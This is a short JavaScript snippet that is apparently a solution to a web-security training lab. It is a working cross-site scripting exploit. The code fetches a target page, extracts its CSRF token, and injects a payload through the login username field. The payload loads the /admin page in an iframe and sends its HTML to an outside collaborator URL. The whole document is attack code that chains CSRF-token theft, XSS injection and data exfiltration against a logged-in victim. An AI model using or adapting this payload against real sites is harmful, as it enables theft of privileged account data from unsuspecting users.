<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">'); // Assume victim already logon, send this payload to make him visit login page again to inject XSS to get content of admin page
  }
  ))
}

fetchUrl("http://192.168.0.14:8080", "http://acd91fb81e485fe5801e8912018a00f4.web-security-academy.net/exploit");
</script> 
